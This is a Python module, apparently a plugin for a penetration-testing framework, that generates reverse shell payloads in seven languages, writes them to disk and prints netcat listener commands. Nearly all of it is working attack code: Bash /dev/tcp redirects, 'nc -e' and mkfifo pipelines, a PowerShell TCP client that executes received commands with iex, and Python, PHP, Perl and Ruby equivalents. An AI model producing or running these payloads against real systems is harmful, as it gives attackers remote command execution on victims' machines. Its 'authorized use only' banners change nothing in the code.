"""
Reverse Shell Generator - Various programming languages
"""

MODULE_INFO = {
    "description": "Generate reverse shells for multiple languages"
}

OPTIONS = {
    "lhost": {
        "type": "str",
        "description": "Listener IP address",
        "required": True,
        "default": "192.168.1.100"
    },
    "lport": {
        "type": "int",
        "description": "Listener port",
        "required": True,
        "default": 4444
    },
    "type": {
        "type": "choice",
        "description": "Reverse Shell type",
        "required": True,
        "choices": ["python", "bash", "php", "netcat", "powershell", "perl", "ruby"],
        "default": "python"
    },
    "output": {
        "type": "str",
        "description": "Output file (optional)",
        "required": False,
        "default": ""
    }
}

def generate_python_reverse_shell(lhost, lport):
    """Generate Python reverse shell"""
    return f'''#!/usr/bin/env python3
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'''

def generate_bash_reverse_shell(lhost, lport):
    """Generate Bash reverse shell"""
    return f'''bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''

def generate_php_reverse_shell(lhost, lport):
    """Generate PHP reverse shell"""
    return f'''<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'");
?>
'''

def generate_netcat_reverse_shell(lhost, lport):
    """Generate Netcat reverse shell"""
    return f'''nc -e /bin/bash {lhost} {lport}
# Alternative:
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f
'''

def generate_powershell_reverse_shell(lhost, lport):
    """Generate PowerShell reverse shell"""
    return f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
'''

def run(session, options):
    lhost = options.get("lhost", "192.168.1.100")
    lport = int(options.get("lport", 4444))
    shell_type = options.get("type", "python")
    output_file = options.get("output", "")
    
    print("⚠️  REVERSE SHELL GENERATOR - AUTHORIZED USE ONLY!")
    print("⚠️  You must start a listener first!")
    print("-" * 60)
    
    print(f"[*] Generating {shell_type} reverse shell")
    print(f"[*] LHOST: {lhost}")
    print(f"[*] LPORT: {lport}")
    print("-" * 60)
    
    # Generate shell
    if shell_type == "python":
        content = generate_python_reverse_shell(lhost, lport)
        ext = ".py"
    elif shell_type == "bash":
        content = generate_bash_reverse_shell(lhost, lport)
        ext = ".sh"
    elif shell_type == "php":
        content = generate_php_reverse_shell(lhost, lport)
        ext = ".php"
    elif shell_type == "netcat":
        content = generate_netcat_reverse_shell(lhost, lport)
        ext = ".sh"
    elif shell_type == "powershell":
        content = generate_powershell_reverse_shell(lhost, lport)
        ext = ".ps1"
    elif shell_type == "perl":
        content = f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};''''
        ext = ".pl"
    elif shell_type == "ruby":
        content = f'''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end''''
        ext = ".rb"
    
    # Display or save
    if output_file:
        with open(output_file, 'w') as f:
            f.write(content)
        print(f"[+] Saved to: {output_file}")
    else:
        default_name = f"reverse_shell{ext}"
        with open(default_name, 'w') as f:
            f.write(content)
        print(f"[+] Saved to: {default_name}")
    
    print(f"\n[+] Reverse Shell Code:")
    print("-" * 40)
    print(content)
    print("-" * 40)
    
    print(f"\n[+] Listener commands:")
    if shell_type in ["python", "bash", "netcat", "php", "perl", "ruby"]:
        print(f"    nc -lvnp {lport}")
    elif shell_type == "powershell":
        print(f"    nc -lvnp {lport}  # Or use PowerShell listener")
    
    print(f"\n[!] Test on authorized systems only!")
    
    return True
